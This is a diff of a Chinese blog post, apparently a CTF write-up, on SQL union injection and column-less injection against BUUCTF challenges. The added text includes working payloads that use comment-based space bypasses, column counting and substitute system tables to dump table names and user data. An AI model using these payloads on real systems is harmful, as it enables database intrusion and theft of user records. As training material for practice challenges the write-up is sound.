@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">540</span>
+            <span class="post-count">1.4k</span>
         </span>
     </span>
 
@@ -106,7 +106,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">2 min</span>
+            <span class="post-count">5 min</span>
         </span>
     </span>
 </div>
@@ -121,10 +121,7 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="sql联合查询-无列名注入"><a href="#sql联合查询-无列名注入" class="headerlink" title="sql联合查询+无列名注入"></a>sql联合查询+无列名注入</h2><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>联合查询注入：</p>
-<p>判断注入点——&gt;判断是整形还是字符型——&gt;判断查询列数——&gt;判断显位</p>
-<p>无列名注入：</p>
-<p>重点在于构造虚拟表便于查询</p>
+  <h2 id="sql联合查询-无列名注入"><a href="#sql联合查询-无列名注入" class="headerlink" title="sql联合查询+无列名注入"></a>sql联合查询+无列名注入</h2><h3 id="sql联合查询"><a href="#sql联合查询" class="headerlink" title="sql联合查询"></a>sql联合查询</h3><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>判断注入点——&gt;判断是整形还是字符型——&gt;判断查询列数——&gt;判断显位</p>
 <h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Information.schema是mysql版本高于5.0才会存在的一个库，可用用来查询库名、表名、列名、用户名、用户权限等等，几乎包括了所有操作。一般用Tables表和Columns表：</p>
 <img src="/source/images/class-1/image-20211111202950975.png" alt="image-20211111202950975" style="zoom:33%;" />
 
@@ -167,7 +164,14 @@
 <p>爆数据得到flag：</p>
 <img src="/source/images/class-1/image-20211111162905089.png" alt="image-20211111162905089" style="zoom:33%;" />
 
-<p><strong>buu的[SWPU2019]Web1</strong>（无列名注入）</p>
+<h3 id="无列名注入（待理解）"><a href="#无列名注入（待理解）" class="headerlink" title="无列名注入（待理解）"></a>无列名注入（待理解）</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>重点在于替换和构造虚拟表便于查询</p>
+<h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>无列名盲注与联合注入类似（基于union，此外还有join）适用于只能获取到数据库和表名，但无法查询列的情况下，但由于information_schema库被过滤了，无法进行常规的查询，需要不同的注入姿势。这时候可以用替代库的思路，就是找一个和information.schema类似的库，借助这个库来查询表名。比如我们利用的库为mysql ，里面有一个innodb_table_stats的表</p>
+<h4 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h4><p>使用 union 查询：select 1,2,3 union select * from admin——我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password</p>
+<p>select 3 from( select 1,2,3 union select * from admin)a——末尾的 a 可以是任意字符，用于命名。用来指向伪造虚拟的表，因为我们用数字指代列名来新构造的表是没有名字的，所以需要一个字符来命名以此指代这个新的表</p>
+<p>select b from (select 1,2,3 as b union select * from admin)a——这里b就刚才是3的重命名</p>
+<p>多数情况下，` （反引号）会被过滤。当 反引号不能使用的时候，使用别名来代替</p>
+<p>select concat(<code>2</code>,0x2d,<code>3</code>) from (select 1,2,3 union select * from admin) a ——用于同时查询多个列，这边的0x2d是-的十六进制编码，作为一种绕过方式</p>
+<h4 id="练手-1"><a href="#练手-1" class="headerlink" title="练手"></a>练手</h4><p><strong>buu的[SWPU2019]Web1</strong>（无列名注入）</p>
 <p>题目：</p>
 <img src="/source/images/class-1/image-20211111172341785.png" alt="image-20211111172341785" style="zoom:53%;" />
 
@@ -175,12 +179,52 @@
 <p>点击立即注册后进行登录：</p>
 <img src="/source/images/class-1/image-20211111172504266.png" alt="image-20211111172504266" style="zoom:53%;" />
 
-<p>点击进入申请发布广告：</p>
+<p>点击进入申请发布广告，每次注入均在广告申请处：</p>
 <img src="/source/images/class-1/image-20211111172613590.png" alt="image-20211111172613590" style="zoom:50%;" />
 
+<p>尝试发布一个1’</p>
+<img src="/source/images/class-1/image-20211111213511388.png" alt="image-20211111213511388" style="zoom:50%;" />
 
+<p>点击广告详情进行查看：</p>
+<img src="/source/images/class-1/image-20211111213618556.png" alt="image-20211111213618556" style="zoom:33%;" />
 
-<h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><p><strong>buu的[极客大挑战 2019]LoveSQL</strong></p>
+<p>根据报错判断可以进行sql注入，且可以猜测到后台sql语句为select * from ads where title = ‘$title’ limit 0,1：</p>
+<img src="/source/images/class-1/image-20211111213920377.png" alt="image-20211111213920377" style="zoom:33%;" />
+
+<p>同时发现在广告内容处输注入语句不会报错，则注入语句应输入广告名中：</p>
+<img src="/source/images/class-1/image-20211112011754190.png" alt="image-20211112011754190" style="zoom:33%;" />
+
+<p>输入-1’ union select 1,2,3进行测试 发现问题：</p>
+<img src="/source/images/class-1/image-20211111221843821.png" alt="image-20211111221843821" style="zoom:67%;" />
+
+<p>测试敏感词汇 得出注释符 空格和or都被注释掉了：</p>
+<p>其中输入注释符和or会显示标题含有敏感词汇，在广告名处空格会自动删除</p>
+<p>空格用/**/绕过，order by改为group by，<code>&#39;/**/group/**/by/**/22,&#39;</code>，注释符则替换为在SQL语句后加一个单引号闭合后面的语句<code>limit 0,1;&#39;</code>或者可以采用闭合的方式代替，如group by  1,’2。（理解）</p>
+<p>输入<code>-1&#39;/**/group/**/by/**/22,&#39;</code>测试字段数发现未报错，可以简单理解为此页面为正确回显：</p>
+<img src="/source/images/class-1/image-20211112003925173.png" alt="image-20211112003925173" style="zoom:33%;" />
+
+<p>当输入<code>-1&#39;/**/group/**/by/**/23,&#39;</code>时可以看到报错，综上说明字段数为22：</p>
+<img src="/source/images/class-1/image-20211112004202228.png" alt="image-20211112004202228" style="zoom:33%;" />
+
+<p>输入<code>-1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code>确定回显位，发现回显位为2和3，更改注入语句即可爆库名：</p>
+<img src="/source/images/class-1/image-20211112004716784.png" alt="image-20211112004716784" style="zoom:33%;" />
+
+<p>爆库名：</p>
+<img src="/source/images/class-1/image-20211112005532522.png" alt="image-20211112005532522" style="zoom:33%;" />
+
+<p>爆表名：——-<code>1&#39;/**/union/**/select/**/1(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code>：<br>本题过滤了or所以不可以用information_schema进行查询，应该寻找替换的表。</p>
+<p><strong>小知识：</strong>考虑以下几个可替代表：sys.schema_auto_increment_columns、mysql.innodb_table_stats</p>
+<img src="/source/images/class-1/image-20211112010328916.png" alt="image-20211112010328916" style="zoom:33%;" />
+
+<p>爆字段：</p>
+<p>利用无列名注入，将第二列命名为别名b，且将所在表虚构为a，否则无列名注入找不到被b新替换的表：</p>
+<p>——<code>-1&#39;/**/union/**/select/**/1(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</code></p>
+<img src="/source/images/class-1/image-20211112010537246.png" alt="image-20211112010537246" style="zoom:33%;" />
+
+<p>爆数据：</p>
+<img src="/source/images/class-1/image-20211112011231015.png" alt="image-20211112011231015" style="zoom:33%;" />
+
+<h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><p><strong>buu的[极客大挑战 2019]LoveSQL</strong></p>
 <p>题目：</p>
 <img src="/source/images/class-1/image-20211111165526197.png" alt="image-20211111165526197" style="zoom:33%;" />
 
@@ -311,7 +355,7 @@
   <nav class="article-nav">
     
     
-      <a href="/2021/11/08/Less-8/" class="article-nav-link">
+      <a href="/2021/11/08/sqli-labs%E9%80%9A%E5%85%B3%E6%8C%87%E5%8D%97/Less-8/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
         <div class="article-nav-title">Less-8</div>
       </a>
